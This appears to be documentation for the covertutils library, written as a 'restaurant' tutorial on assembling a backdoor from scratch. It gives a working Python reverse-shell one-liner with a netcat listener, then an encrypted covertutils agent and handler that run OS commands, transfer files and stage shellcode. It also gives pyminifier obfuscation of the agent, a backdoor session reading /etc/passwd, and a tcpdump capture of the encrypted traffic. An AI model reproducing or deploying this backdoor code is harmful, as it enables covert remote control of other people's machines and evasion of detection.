Assembling a Backdoor **from Scratch** - *The Tutorial Restaurant*
==================================================================




For Starters - Without `covertutils`
------------------------------------


The simplest possible reverse TCP shell in `Python` is the one below:

Agent
+++++

.. code:: python

	import socket,subprocess,os
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.0.0.1",1234))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"]);

Source is the everlasting PentestMonkey_ .

.. _PentestMonkey : http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


When these commands run on the compromised host a reverse TCP connection spawns towards `10.0.0.1:1234`. The compromised host then maps all input and output of this TCP connection to a process, started by the ``/bin/sh`` binary.

So the other side of the TCP connection directly interacts with the remote process (which happens to be `a shell`).
But I bet that you know all that.



So this code snippet above is the `Agent`. Moving on...



Handler
+++++++

.. code:: bash

	$ nc -nlvp 1234

The `Handler` just needs to accept the TCP connection. Sending any data through that connection will end up running in the remote `shell` process.


So, the ingredients of this backdoor are the following:

 - `Agent`: The Python code
 - `Handler` : The ``netcat`` bind listen command
 - `Communication Channel` : TCP connection
 - `Commands` : `plaintext` shell commands and responses come and go


Main Course - With `covertutils`
--------------------------------


Let's remake a `reverse TCP shell`, but that time using `covertutils`.

Agent
+++++



Orchestration Step
^^^^^^^^^^^^^^^^^^

First we are gonna need an ``Orchestrator`` object. This will **password-protect our communication**, providing us fixed-size byte arrays. Those bytes can be transmitted in any way, plus recognized **amongst random data**.

.. code:: python

	from covertutils.orchestration import SimpleOrchestrator

	orch_obj = SimpleOrchestrator(
		"Our passphrase can be anything! &^&%{}",
		out_length = 20,
		in_length = 20,
		)


Done. Now we are sure that all byte arrays leaving our side will have a fixed length of 20 bytes (even if we send a plain ``whoami`` command which consists of 6 bytes). This is in case we need to fit them somewhere where a fixed bytelength is needed...

We also have to be sure that every byte array arriving to our side is also of 20 bytes exactly.

Finally, the arrays are `crypto-scrambled` using derivatives of our `passphrase`, so they will look gibberish to anyone that doesn't have that `passphrase`.

Communication Channel Step
^^^^^^^^^^^^^^^^^^^^^^^^^^

Then, we have to provide wrappers for the `Communication Channel`. TCP that is. So, making a ``send( data )`` and a ``recv()`` blocking function will be dead simple:

.. code:: python

	import socket
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("127.0.0.5",1234)) # <------- aim for 'localhost' at first

	def send( data ) :
		s.send( data )

	def recv() :		# Return for every 20 bytes
		return s.recv(20)	# This will automatically block as socket.recv() is a blocking method


All set. Special needs on data that will go through the wire can be coded in those functions too!

For example, if we need all data to travel in ``base64``, then we create the ``send( data )`` and ``recv()`` as below:

.. code:: python

	import codecs

	def send( data ) :
		s.send( codecs.encode( data, 'base64') )	# Data will travel in Base64

	def recv() :
		data = s.recv(28)	# Base 64 length of 20 bytes
		return codecs.decode( data, 'base64')	# Raw bytes will be finally received


.. note:: This won't affect the ``SimpleOrchestrator``'s byte length assertion of 20 bytes, as the ``recv()`` function decodes the data to the original byte length.


Feature Step
^^^^^^^^^^^^

Now, that `Data Orchestration` and `Communication Channel` are all set, we need to define the features of this backdoor!

So, let's make some cool stuff using the ``BaseHandler`` first !



.. code:: python

	from covertutils.handlers import BaseHandler

	class MyAgent_Handler( BaseHandler ) :
		""" This class tries hard to be self-explanatory """

		def __init__(self, recv, send, orch, **kw) :
			super( MyAgent_Handler, self ).__init__( recv, send, orch, **kw )
			print ( "[!] Agent with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
			print()


		def onMessage( self, stream, message ) :
			print ( "[+] Message arrived!" )
			print ( "{} -> {}".format(stream, message) )
			print ("[>] Sending the received message in reverse order!")
			self.preferred_send( message[::-1] )	# Will respond with the reverse of what was received!

		def onChunk( self, stream, message ) :
			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
			if message :
				print ("[*] Message assembled. onMessage() will be called next!")
			print()

		def onNotRecognised(self) :
			print ("[-] Got some Gibberish")
			print ("Initialized the Orchestrator with wrong passphrase?")
			print()


Those methods will be called **automatically** by an internal thread (no need to start it manually), so anything written to their bodies will run when circumstances meet.


Putting it all together!
^^^^^^^^^^^^^^^^^^^^^^^^


.. code :: python

	handler_obj = MyAgent_Handler(recv, send, orch_obj)

	from time import sleep

	while True : sleep(10)


**Done!**

Once this script runs, and the ``MyAgent_Handler`` gets instantiated, it will listen to the TCP connection (`internal thread magic`) and run the ``on*`` methods automatically.

As all backdoor functionality is implemented in those methods (sending back the received messages reversed - `reverse echo`), our **Agent is FINISHED!**


With such agent we can't have a simple ``netcat`` `Handler` though... We need something bigger. Let's jump to it...


Handler
+++++++



Orchestration Step
^^^^^^^^^^^^^^^^^^

Same stuff:

.. code:: python

	from covertutils.orchestration import SimpleOrchestrator

	orch_obj = SimpleOrchestrator(
		"Our passphrase can be anything! &^&%{}",
		out_length = 20,
		in_length = 20,
		reverse = True,	# <-------
		)

Just do not forget the ``reverse = True`` argument to create the `complementary` encryption keys and stuff. This is **all internal**, no need to care.


.. warning :: Oh, and passing a different `passphrase` will result in your backdoor not working. I bet you could see that coming!


Pretty straightforward, moving on...


Communication Channel Step
^^^^^^^^^^^^^^^^^^^^^^^^^^

As we have a `Reverse TCP` connection, our `Handler` must be a `TCP listener`.

Pure python socket magic ahead:

.. code ::

	import socket

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	# To make the port immediately available after killing - gimmick
	s.bind( ("0.0.0.0", 1234) )	# Listen to all interfaces at port 1234
	s.listen(5)

	client, client_addr = s.accept()



And our wrappers:


.. code ::


	def recv () :		# Create wrappers for networking
		return client.recv( 20 )

	def send( raw ) :		# Create wrappers for networking
		return client.send( raw )



Feature Step
^^^^^^^^^^^^

.. code:: python

	from covertutils.handlers import BaseHandler

	class MyHandler_Handler( BaseHandler ) :
		""" This class tries hard to be self-explanatory """

		def __init__(self, recv, send, orch, **kw) :
			super( MyHandler_Handler, self ).__init__( recv, send, orch, **kw )
			print ( "[!] Handler with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
			print()


		def onMessage( self, stream, message ) :
			print ( "[+] Message arrived!" )
			print ( "{} -> {}".format(stream, message) )
			print ( "[<] Original Message {}".format(message[::-1]) ) # <-------

		def onChunk( self, stream, message ) :
			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
			if message :
				print ("[*] Message assembled. onMessage() will be called next!")
			print()

		def onNotRecognised(self) :
			print ("[-] Got some Gibberish")
			print ("Initialized the Orchestrator with wrong passphrase?")
			print()


So the plan is that for `PoC purposes` the `Agent` will read all messages sent to it and respond with their `reversed` form.
The `Handler` though, will display to the user the reversed form of what it received, finally printing the original message.




Putting it all together!
^^^^^^^^^^^^^^^^^^^^^^^^

.. code :: python

	handler_obj = MyHandler_Handler(recv, send, orch_obj)

This time we need to interact with the ``handler_obj`` instance, in order to actually send stuff to our `Agent`.
For that we can use the :meth:`preferred_send` method of the :class:`BaseHandler` class which honors the `Behavior` of the `Handler` object (more on this at :ref:`behaviors`).




.. code :: python


	try: input = raw_input	# Python 2/3 nonsense
	except NameError: pass	# (fuck my life)

	while True :
		inp = input("~~~> ")
		if inp :
			handler_obj.preferred_send( inp )


Here we got a custom shell that gets user input and sends it over.

There is a vastly better way but I'll leave it for **Dessert**.


Code Reference
++++++++++++++

The ``copy-paste``-able code examples of the above tutorial.

The code is under the ``examples/docs/simple/`` directory of the repo.

The `Handler's` Code
^^^^^^^^^^^^^^^^^^^^

.. literalinclude:: ../examples/docs/simple/reverse_tcp_handler.py


The `Agent's` Code
^^^^^^^^^^^^^^^^^^

**Plain Agent**

.. literalinclude:: ../examples/docs/simple/reverse_tcp_agent.py


The ``pyMinified`` **Agent** "*Code*"
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code :: bash

	pyminifier --obfuscate-builtins --obfuscate-classes --obfuscate-import-methods  --obfuscate-variables --gzip <file>


.. literalinclude:: ../examples/docs/simple/reverse_tcp_agent.obf.py

.. note :: The ``pyminifier`` run is a full *Obfuscation & Compression* round without the ``--obfuscate-functions`` switch.

	This switch is **omitted** to not rename the ``on*`` methods as they are ``BaseHandler`` overriding methods.


Demonstration
+++++++++++++

Initiating the `Agent`

.. code :: bash

	[!] Agent with Orchestrator ID: '3f8f7f8ff33fc01e' started!

Initiating the `Handler`

.. code :: bash

	[!] Handler with Orchestrator ID: 'c07080700cc03fe1' started!

.. note :: If you are Observant enough you would see that the 2 IDs aren't same. But ``AND``-ing them results to `0`. That means that the ``Orchestrator`` objects are **compatible**.

Sending The String :

	"`Hello Mary Lou, goodbye heart./ Sweet Mary Lou I'm so in love with you`"

*Certainly more than 20 bytes.*

Handler
^^^^^^^^

.. code :: bash

	~~~> Hello Mary Lou, goodbye heart./ Sweet Mary Lou I'm so in love with you
	[+] Chunk arrived for stream 'control' !
	()[+] Chunk arrived for stream 'control' !

	()
	[+] Chunk arrived for stream 'control' !
	()
	[+] Chunk arrived for stream 'control' !
	()
	[+] Chunk arrived for stream 'control' !
	[*] Message assembled. onMessage() will be called next!
	()
	[+] Message arrived!
	control -> uoy htiw evol ni os m'I uoL yraM teewS /.traeh eybdoog ,uoL yraM olleH
	[<] Original Message Hello Mary Lou, goodbye heart./ Sweet Mary Lou I'm so in love with you
	~~~>


Agent
^^^^^^

.. code:: bash

	[+] Chunk arrived for stream 'control' !
	 [+] Chunk arrived for stream 'control' !
	()
	()
	 [+] Chunk arrived for stream 'control' !
	()
	[+] Chunk arrived for stream 'control' !
	 [+] Chunk arrived for stream 'control' !
	()
	[*] Message assembled. onMessage() will be called next!
	()
	[+] Message arrived!
	control -> Hello Mary Lou, goodbye heart./ Sweet Mary Lou I'm so in love with you
	[>] Sending the received message in reverse order!


.. note :: The ``()`` here and there is the ``print ()`` Python2/3 nonsense.


Dessert - Real Life Backdoor With `covertutils`
-----------------------------------------------


Here we will use the goodies that are found in the ``impl`` sub-packages to snip away most of the code while actually adding functionality!


Agent
+++++

The `Orchestration Step` is boringly same. Blah, blah `encryption`, blah blah `chunks`, blah...

The same goes for `Communication Channel Step`. It's a TCP connection. No magic there.

Let's move to the juicy part!


Feature Step
^^^^^^^^^^^^

Let's make our backdoor to actually run shell commands! We could do that by hand, with:

.. code:: python

	import os

	# [...] Handler Class definition

		def onMessage(self, stream, message) :
			resp = os.popen(message).read()

	# [...] Overriding rest of the on*() methods


And sending the response back to the `Handler` would be as easy as:

.. code:: python

	import os

	# [...] Handler Class definition

		def onMessage(self, stream, message) :
			resp = os.popen(message).read()
			self.preferred_send(resp)	# <-------

	# [...] Overriding rest of the on*() methods


**But**

The class ``ExtendableShellHandler`` (docs @ :class:`covertutils.handlers.impl.extendableshell.ExtendableShellHandler`) does provide:

 - OS shell commands
 - Python remote interpretation in the stage module API (see: :ref:`stage_api_page`)
 - `File upload/download` functionality
 - Extendability through the `module staging system` (see: :ref:`stages_page`)
 - Agent Control stream, for `OTP key resetting` and `connection reclaiming`

All above things will run on different `Streams` (see: :ref:`streams_arch`), meaning that they will have different OTP keys.

Plus all those will be done **without the need to make an inheriting class** (as it is in ``impl`` subpackage)!

.. note:: That is except when you need any behaviors `Handler` classes - see: :ref:`behaviors`. If that is the case you can create a class inheriting both from ``ExtendableShellHandler`` and a behavior `Handler` class (e.g. ``InterrogatingHandler`` class - Docs @ :class:`covertutils.handlers.interrogating.InterrogatingHandler`). **Multiple Inheritance Rocks!**


So the code would be like:

.. code:: python

	from covertutils.handlers.impl import ExtendableShellHandler

	ext_handler_obj = ExtendableShellHandler(recv, send, orch_obj)

	from time import sleep

	while True : sleep(10)


Let's go to the `Handler` and ask for the `Check`...


Handler
+++++++


Same boring stuff for `Orchestration Step` and `Communication Channel Step`.



Feature Step
^^^^^^^^^^^^

The `Handler` part here shouldn't change too.

.. code:: python

	# ========== Completely Unchanged ==========
	from covertutils.handlers import BaseHandler

	class MyHandler_Handler( BaseHandler ) :
		""" This class tries hard to be self-explanatory """

		def __init__(self, recv, send, orch, **kw) :
			super( MyHandler_Handler, self ).__init__( recv, send, orch, **kw )
			print ( "[!] Handler with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )
			print()


		def onMessage( self, stream, message ) :
			print ( "[+] Message arrived!" )
			print ( "{} -> {}".format(stream, message) )
			print ( "[<] Original Message {}".format(message[::-1]) )	# <-------

		def onChunk( self, stream, message ) :
			print ( "[+] Chunk arrived for stream '{}' !".format(stream) )
			if message :
				print ("[*] Message assembled. onMessage() will be called next!")
			print()

		def onNotRecognised(self) :
			print ("[-] Got some Gibberish")
			print ("Initialized the Orchestrator with wrong passphrase?")
			print()
	# ==========================================

It has to be instantiated as well:


.. code :: python

	handler_obj = MyHandler_Handler(recv, send, orch_obj)


But here we will do a lil' change. We won't use that shitty ``[raw_]input`` shell! There are great shell alternatives in :mod:`covertutils.shell.impl`, perfectly pairing with classes in the :mod:`covertutils.handlers.impl` sub-package.

For the ``ExtendableShellHandler`` that is running in the other side, the ``ExtendableShell`` (Docs @ :class:`covertutils.shells.impl.extendableshell.ExtendableShell` will fit just great!

It provides all needed support to interact with the awaiting `Agent`, by using the SubShells corresponding to ``ExtendableShellHandler`` preloaded `stage modules`.


**AND**

As the ``ExtendableShell`` handles all `printing to the screen` the ``MyHandler_Handler`` class can be as `barebones` as:

.. code :: python

	from covertutils.handlers import BaseHandler

	class MyHandler_Handler( BaseHandler ) :
		""" This class tries hard to be self-explanatory """

		def __init__(self, recv, send, orch, **kw) :
			super( MyHandler_Handler, self ).__init__( recv, send, orch, **kw )
			print ( "[!] Handler with Orchestrator ID: '{}' started!".format( orch.getIdentity() ) )

		def onMessage( self, stream, message ) :	pass

		def onChunk( self, stream, message ) :	pass

		def onNotRecognised(self) :	pass




And the code for instantiation looks like this:


.. code :: python

	from covertutils.shells.impl import ExtendableShell

	shell = ExtendableShell(handler_obj, prompt = "[MyFirst '{package}' Shell] > ")
	shell.start()



Code Reference
++++++++++++++

The ``copy-paste``-able code examples of the above tutorial.

The code is under the ``examples/docs/advanced/`` directory of the repo.

The `Handler's` Code
^^^^^^^^^^^^^^^^^^^^

.. literalinclude:: ../examples/docs/advanced/reverse_tcp_handler.py


The `Agent's` Code
^^^^^^^^^^^^^^^^^^

**Plain Agent**

.. literalinclude:: ../examples/docs/advanced/reverse_tcp_agent.py


The ``pyMinified`` **Agent** "*Code*"
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code :: bash

	pyminifier --obfuscate-builtins --obfuscate-classes --obfuscate-import-methods  --obfuscate-variables --gzip <file>


.. literalinclude:: ../examples/docs/advanced/reverse_tcp_agent.obf.py


Demonstration
+++++++++++++

This time the `Agent` is **completely silent**.


.. code :: bash

	[!] Handler with Orchestrator ID: 'c07080700cc03fe1' started!
	[MyFirst 'covertutils' Shell] >
	[MyFirst 'covertutils' Shell] >
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - file
		[ 4] - stage
		[99] - Back
	Select stream: 2
	[os-shell]> ls
	agent.exe
	covertutils
	covertutils.egg-info
	dist
	doc_example_simple_agent.min.py
	doc_example_simple_agent.py
	doc_example_simple_handler.py
	docs
	examples
	htmlcov
	makefile
	MANIFEST
	MANIFEST.in
	manual_testbed.py
	prompt_manual_test.py
	README.md
	requirements.txt
	sc_exec.py
	sc.py
	setup.py
	tcp_reverse_agent.exe
	tcp_reverse_agent.py
	tests
	tox.ini
	zip_agent_udp.exe
	zip_stge.py

	[os-shell]> !stage mload covertutils.payloads.linux.shellcode
	covertutils.shells.subshells.shellcodesubshell.ShellcodeSubShell
	shellcode
	[os-shell]>
	[MyFirst 'covertutils' Shell] >
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - file
		[ 4] - shellcode
		[ 5] - stage
		[99] - Back
	Select stream: 4
	This shell will properly format shellcode
		pasted from sources like "exploit-db.com" and "msfvenom"
	[shellcode]>
	[shellcode]>
	[MyFirst 'covertutils' Shell] > exit
	[!]	Quit shell? [y/N] y


The Check
---------


Congrats hoodie guy! You made your first `Reverse TCP Backdoor` that supports extensions written in `Python` and `file upload/download`!

Throw in some `parameterization` (**un-hardcode** `passphrase` and addresses), `code minification` (pyMinify_ that code) and `connection re-attempt mechanism` (see :ref:`rev_tcp`), and you are done!

**This will cost you 0$ sir...**

.. _pyMinify : https://liftoff.github.io/pyminifier/


*Be polite enough to `share your creations`. Or at least sell them `for the same price`...


The Walkin' Away
----------------

Now that we are full, and our backdoor is planted, we can walk away like nothing happened... Some ``pcap files`` will be left behind, merely outlining our full domination in this restaurant.

The Command
+++++++++++

.. code :: bash

	[!] Handler with Orchestrator ID: 'c07080700cc03fe1' started!
	[MyFirst 'covertutils' Shell] > !os-shell cat /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	[...]
	clamav:x:135:142::/var/lib/clamav:/bin/false
	Debian-snmp:x:121:125::/var/lib/snmp:/bin/false
	unused:x:1000:1000::/home/unused:/bin/bash

	[MyFirst 'covertutils' Shell] >
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - file
		[ 4] - stage
		[99] - Back
	Select stream: 99
	[MyFirst 'covertutils' Shell] > exit
	[!]	Quit shell? [y/N] y


The Network Traffic
+++++++++++++++++++

.. code :: bash

	# tcpdump -X -i lo
	tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
	listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	02:30:59.629216 IP localhost.41046 > localhost.1234: Flags [S], seq 1561030109, win 43690, options [mss 65495,sackOK,TS val 16121424 ecr 0,nop,wscale 7], length 0
		0x0000:  4500 003c 938d 4000 4006 a92c 7f00 0001  E..<..@.@..,....
		0x0010:  7f00 0001 a056 04d2 5d0b 6ddd 0000 0000  .....V..].m.....
		0x0020:  a002 aaaa fe30 0000 0204 ffd7 0402 080a  .....0..........
		0x0030:  00f5 fe50 0000 0000 0103 0307            ...P........
	02:30:59.629232 IP localhost.1234 > localhost.41046: Flags [S.], seq 537038899, ack 1561030110, win 43690, options [mss 65495,sackOK,TS val 16121424 ecr 16121424,nop,wscale 7], length 0
		0x0000:  4500 003c 0000 4000 4006 3cba 7f00 0001  E..<..@.@.<.....
		0x0010:  7f00 0001 04d2 a056 2002 9033 5d0b 6dde  .......V...3].m.
		0x0020:  a012 aaaa fe30 0000 0204 ffd7 0402 080a  .....0..........
		0x0030:  00f5 fe50 00f5 fe50 0103 0307            ...P...P....
	02:30:59.629240 IP localhost.41046 > localhost.1234: Flags [.], ack 1, win 342, options [nop,nop,TS val 16121424 ecr 16121424], length 0
		0x0000:  4500 0034 938e 4000 4006 a933 7f00 0001  E..4..@.@..3....
		0x0010:  7f00 0001 a056 04d2 5d0b 6dde 2002 9034  .....V..].m....4
		0x0020:  8010 0156 fe28 0000 0101 080a 00f5 fe50  ...V.(.........P
		0x0030:  00f5 fe50                                ...P
	02:31:09.854301 IP localhost.1234 > localhost.41046: Flags [P.], seq 1:21, ack 1, win 342, options [nop,nop,TS val 16123980 ecr 16121424], length 20
		0x0000:  4500 0048 6e64 4000 4006 ce49 7f00 0001  E..Hnd@.@..I....
		0x0010:  7f00 0001 04d2 a056 2002 9034 5d0b 6dde  .......V...4].m.
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 084c  ...V.<.........L
		0x0030:  00f5 fe50 da50 01c8 b0b6 999d 0c9c 2dfe  ...P.P........-.
		0x0040:  0482 4b02 77e1 3805                      ..K.w.8.
	02:31:09.854388 IP localhost.41046 > localhost.1234: Flags [.], ack 21, win 342, options [nop,nop,TS val 16123980 ecr 16123980], length 0
		0x0000:  4500 0034 938f 4000 4006 a932 7f00 0001  E..4..@.@..2....
		0x0010:  7f00 0001 a056 04d2 5d0b 6dde 2002 9048  .....V..].m....H
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 084c  ...V.(.........L
		0x0030:  00f6 084c                                ...L
	02:31:09.975703 IP localhost.41046 > localhost.1234: Flags [P.], seq 1:21, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16123980], length 20
		0x0000:  4500 0048 9390 4000 4006 a91d 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6dde 2002 9048  .....V..].m....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 084c 15fb 7dcd c8cb 229c 3616 ef94  ...L..}...".6...
		0x0040:  0aab 5fd8 410a b497                      .._.A...
	02:31:09.975806 IP localhost.1234 > localhost.41046: Flags [.], ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e65 4000 4006 ce5c 7f00 0001  E..4ne@.@..\....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6df2  .......V...H].m.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.975839 IP localhost.41046 > localhost.1234: Flags [P.], seq 21:41, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9391 4000 4006 a91c 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6df2 2002 9048  .....V..].m....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 81a4 3124 dc86 85ce 888f e5e7  ...k..1$........
		0x0040:  24b6 d3a9 a37a 8085                      $....z..
	02:31:09.975842 IP localhost.1234 > localhost.41046: Flags [.], ack 41, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e66 4000 4006 ce5b 7f00 0001  E..4nf@.@..[....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e06  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.975887 IP localhost.41046 > localhost.1234: Flags [P.], seq 41:61, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9392 4000 4006 a91b 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e06 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 2b01 2bc1 8634 b6fd 9d6a 8a55  ...k+.+..4...j.U
		0x0040:  ee26 e53c ed75 aaba                      .&.<.u..
	02:31:09.975890 IP localhost.1234 > localhost.41046: Flags [.], ack 61, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e67 4000 4006 ce5a 7f00 0001  E..4ng@.@..Z....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e1a  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.975925 IP localhost.41046 > localhost.1234: Flags [P.], seq 61:81, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9393 4000 4006 a91a 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e1a 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 7992 8950 e5ae b437 4ed3 8dfc  ...ky..P...7N...
		0x0040:  d7c6 20cd 9cc9 9659                      .......Y
	02:31:09.975927 IP localhost.1234 > localhost.41046: Flags [.], ack 81, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e68 4000 4006 ce59 7f00 0001  E..4nh@.@..Y....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e2e  .......V...H].n.
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.975959 IP localhost.41046 > localhost.1234: Flags [P.], seq 81:101, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9394 4000 4006 a919 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e2e 2002 9048  .....V..].n....H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 551d 8068 24c4 c543 b338 c54b  ...kU..h$..C.8.K
		0x0040:  d99d 4f24 e06a 868f                      ..O$.j..
	02:31:09.975960 IP localhost.1234 > localhost.41046: Flags [.], ack 101, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e69 4000 4006 ce58 7f00 0001  E..4ni@.@..X....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e42  .......V...H].nB
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.975991 IP localhost.41046 > localhost.1234: Flags [P.], seq 101:121, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9395 4000 4006 a918 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e42 2002 9048  .....V..].nB...H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b f553 b059 e8db 7074 7498 f2c4  ...k.S.Y..ptt...
		0x0040:  b414 b476 4d23 2c03                      ...vM#,.
	02:31:09.975992 IP localhost.1234 > localhost.41046: Flags [.], ack 121, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e6a 4000 4006 ce57 7f00 0001  E..4nj@.@..W....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e56  .......V...H].nV
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976040 IP localhost.41046 > localhost.1234: Flags [P.], seq 121:141, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9396 4000 4006 a917 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e56 2002 9048  .....V..].nV...H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 7f43 e8b0 2143 24f2 2882 9493  ...k.C..!C$.(...
		0x0040:  0687 ab6d b1c4 d86f                      ...m...o
	02:31:09.976041 IP localhost.1234 > localhost.41046: Flags [.], ack 141, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e6b 4000 4006 ce56 7f00 0001  E..4nk@.@..V....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e6a  .......V...H].nj
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976110 IP localhost.41046 > localhost.1234: Flags [P.], seq 141:161, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9397 4000 4006 a916 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e6a 2002 9048  .....V..].nj...H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 4177 0797 f0d9 380b 7aa2 3213  ...kAw....8.z.2.
		0x0040:  0e2d 0211 3612 f227                      .-..6..'
	02:31:09.976112 IP localhost.1234 > localhost.41046: Flags [.], ack 161, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e6c 4000 4006 ce55 7f00 0001  E..4nl@.@..U....
		0x0010:  7f00 0001 04d2 a056 2002 9048 5d0b 6e7e  .......V...H].n~
		0x0020:  8010 0156 fe28 0000 0101 080a 00f6 086b  ...V.(.........k
		0x0030:  00f6 086b                                ...k
	02:31:09.976149 IP localhost.41046 > localhost.1234: Flags [P.], seq 161:181, ack 21, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 20
		0x0000:  4500 0048 9398 4000 4006 a915 7f00 0001  E..H..@.@.......
		0x0010:  7f00 0001 a056 04d2 5d0b 6e7e 2002 9048  .....V..].n~...H
		0x0020:  8018 0156 fe3c 0000 0101 080a 00f6 086b  ...V.<.........k
		0x0030:  00f6 086b 475c 60b4 9feb a8c3 1d04 408e  ...kG\`.......@.
		0x0040:  6820 1f0c af73 b8b5                      h....s..
	02:31:09.976150 IP localhost.1234 > localhost.41046: Flags [.], ack 181, win 342, options [nop,nop,TS val 16124011 ecr 16124011], length 0
		0x0000:  4500 0034 6e6d 4000 4006 ce54 7f00 0001  E..4nm@.@..T....
